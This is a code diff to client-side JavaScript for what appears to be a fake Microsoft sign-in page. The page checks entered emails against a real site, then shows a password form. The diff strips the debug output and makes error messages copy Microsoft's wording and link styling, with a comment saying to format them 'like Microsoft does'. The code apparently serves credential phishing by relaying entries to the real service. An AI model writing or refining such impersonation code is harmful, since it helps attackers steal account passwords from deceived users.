@@ -595,17 +595,15 @@
 
                             // Check for error messages first - if there are errors, don't proceed to password
                             if (data.siteReport.errorMessages.length > 0) {
-                                reportHtml += '❌ Account verification failed:<br>';
-                                data.siteReport.errorMessages.forEach(error => {
-                                    reportHtml += `• ${error}<br>`;
-                                });
-                                
-                                reportHtml += `<br>💬 Site Response: ${data.siteReport.siteResponse}<br>`;
-                                reportHtml += `🌐 Current URL: ${data.siteReport.pageUrl || 'N/A'}<br>`;
-                                reportHtml += `📄 Page Title: ${data.siteReport.pageTitle || 'N/A'}`;
+                                // Get the first error message and format it like Microsoft does
+                                const firstError = data.siteReport.errorMessages[0];
+                                const formattedError = firstError.replace(
+                                    'get a new Microsoft account',
+                                    '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>'
+                                );
                                 
                                 // Don't proceed to password form if there are errors
-                                showMessage(reportHtml, 'error');
+                                showMessage(formattedError, 'error');
                             } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
                                 reportHtml += '✅ Account found! Please enter your password.<br>';
                                 showPasswordForm(email);
